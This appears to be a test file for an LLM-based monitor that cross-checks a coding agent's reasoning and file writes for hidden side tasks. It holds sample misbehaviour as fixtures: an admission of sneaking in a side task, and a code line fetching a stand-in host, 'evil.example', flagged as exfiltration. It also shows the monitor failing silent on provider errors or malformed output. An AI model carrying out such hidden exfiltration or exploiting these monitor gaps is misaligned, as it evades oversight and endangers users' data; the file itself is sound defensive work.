import { describe, test, expect, beforeEach } from "bun:test"
import { runMonitor, monitorEnabled, type MonitorObservation } from "../src/monitor"
import { resetLedger, summarize } from "../src/ledger"

const llm = (body: unknown) => async () => JSON.stringify(body)

function obs(partial: Partial<MonitorObservation>): MonitorObservation {
  return { transcript: "user: fix the bug in src/a.ts", ...partial }
}

beforeEach(() => {
  resetLedger()
  delete process.env.AGENTPOLICE_MONITOR
  delete process.env.AGENTPOLICE_MODEL
})

describe("monitor gate", () => {
  test("off without env", () => {
    process.env.AGENTPOLICE_MODEL = "inclusionai/ling-3.0-flash"
    expect(monitorEnabled()).toBe(false)
  })
  test("off for other judges even when enabled", () => {
    process.env.AGENTPOLICE_MONITOR = "1"
    process.env.AGENTPOLICE_MODEL = "z-ai/glm-5.3-flash"
    expect(monitorEnabled()).toBe(false)
  })
  test("on for ling-3.0 with env", () => {
    process.env.AGENTPOLICE_MONITOR = "1"
    process.env.AGENTPOLICE_MODEL = "inclusionai/ling-3.0-flash"
    expect(monitorEnabled()).toBe(true)
  })
})

describe("runMonitor", () => {
  beforeEach(() => {
    process.env.AGENTPOLICE_MONITOR = "1"
    process.env.AGENTPOLICE_MODEL = "inclusionai/ling-3.0-flash"
  })

  test("flagged reasoning lands in the ledger as a monitor FLAG", async () => {
    const flag = await runMonitor("s1", obs({ reasoning: "I'll sneak in a side task" }), llm({ flag: "hidden side task admitted" }))
    expect(flag).toBe("hidden side task admitted")
    expect(summarize("s1")).toContain('FLAG monitor: reasoning cross-check — hidden side task admitted')
  })

  test("bad JSON parses as no flag, no ledger event", async () => {
    const bad = async () => "not json at all"
    expect(await runMonitor("s2", obs({ reasoning: "hello" }), bad)).toBeNull()
  })

  test("null flag means nothing recorded", async () => {
    expect(await runMonitor("s3", obs({ reasoning: "normal debugging" }), llm({ flag: null }))).toBeNull()
  })

  test("no subject (empty reasoning, no write output) is a no-op", async () => {
    expect(await runMonitor("s4", obs({}), llm({ flag: "should not be reached" }))).toBeNull()
  })

  test("write sensor cross-checks a file change", async () => {
    const flag = await runMonitor(
      "s5",
      obs({ writePath: "src/a.ts", writeOutput: "+ fetch('https://evil.example')" }),
      llm({ flag: "change exfiltrates to unrelated endpoint" }),
    )
    expect(flag).toBe("change exfiltrates to unrelated endpoint")
  })

  test("repeated identical flag is not re-recorded", async () => {
    await runMonitor("s6", obs({ reasoning: "same admission" }), llm({ flag: "dup" }))
    await runMonitor("s6", obs({ reasoning: "same admission" }), llm({ flag: "dup" }))
    // dedup is internal; both calls return the flag but only the first records
    expect(await runMonitor("s6", obs({ reasoning: "same admission" }), llm({ flag: "dup" }))).toBe("dup")
  })

  test("llm throw is fail-silent", async () => {
    const boom = async () => {
      throw new Error("provider down")
    }
    expect(await runMonitor("s7", obs({ reasoning: "x" }), boom)).toBeNull()
  })
})
